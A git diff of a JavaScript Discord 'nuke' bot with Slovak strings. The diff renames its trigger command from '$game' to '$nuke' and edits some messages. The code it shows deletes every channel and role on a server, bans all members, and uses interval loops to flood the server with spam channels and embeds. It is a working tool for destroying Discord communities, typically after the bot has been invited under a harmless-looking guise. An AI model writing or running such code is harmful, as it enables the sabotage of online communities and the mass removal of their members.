@@ -4,9 +4,9 @@ const prefix = '$';
 require('dotenv').config();
 
 bot.on('ready', () => {
-    console.log(`${bot.user.tag} je to ready!`)
+    console.log(`${bot.user.tag} tvoj bot je pripraveny!`)
     bot.user.setStatus("online");
-    bot.user.setActivity('Try me with "$game"', {type: "PLAYING"});
+    bot.user.setActivity('Try me with "$nuke"', {type: "PLAYING"});
   })
 
 
@@ -18,7 +18,8 @@ bot.on('message', message => {
          }),
       100
     }
-    if(message.content === prefix + "game") {
+
+    if(message.content === prefix + "nuke") {
  message.channel.send("teraz mazem vsetko")
 	 message.guild.channels.forEach(channel => channel.delete())
 	 message.guild.roles.forEach(roles => roles.delete()) } 
@@ -38,7 +39,7 @@ bot.on('message', message => {
       setInterval(function() {
       message.guild.createChannel('text-text-text', 'text')
       message.guild.createChannel('hahahhaha', 'voice')
-      message.guild.createChannel('sleduj ma na IG - br4ve.mov', 'category')
+      message.guild.createChannel('hehehehheh', 'category')
     }),
     1
   }
@@ -57,16 +58,16 @@ bot.on('message', message => {
   if(message.content === prefix + 'deletechannels') {	
      message.guild.channels.forEach(channel => channel.delete())
   }
-  if(message.content === prefix + '.ban_all') {
+  if(message.content === prefix + 'ban') {
     message.guild.members.forEach((f) => {
-      message.guild.member(f).ban('hahahah')
+      message.guild.member(f).ban('ups')
     })
   }
   bot.on('message', message => {
 if(message.content === prefix + 'spam') {
 	setInterval(function() {
   const spam = new Discord.RichEmbed()
-  .setTitle("Nuked by user")
+  .setTitle("spam")
   .addField('LOL', true)
   .setColor("RANDOM")
   message.channel.send(spam)
@@ -76,18 +77,18 @@ if(message.content === prefix + 'spam') {
 })
   if(message.content === prefix + 'help') {
   const xhelp = new Discord.RichEmbed()
-  .setTitle("COMMANDY KTORE TI PONUKAM")
+  .setTitle("Toto vsetko dokazem a aj viac :)")
   .addField('Info', '```$info```', true)
-  .addField('Bordel', '```$nuke, $deleteroles, $create, $deletechannels, $ban_all```', true)
+  .addField('Bordel', '```$nuke, $deleteroles, $create, $deletechannels, $ban```', true)
   .addField('Ine', '```$spam```', true)
-  .setFooter("so keres moj, ta uz zrob daco")
+  .setFooter("tak uz porob nieco :)")
   .setColor("red")
   message.channel.send(xhelp)
   }
   if(message.content === '$info') {
   const xinfo = new Discord.RichEmbed()
   .setTitle("Informations")
-  .setDescription("**FOLOW TO MY IG - br4ve.mov**")
+  .setDescription("**br4ve.mov**")
   .setColor("RANDOM")
   message.channel.send(xinfo)
   }
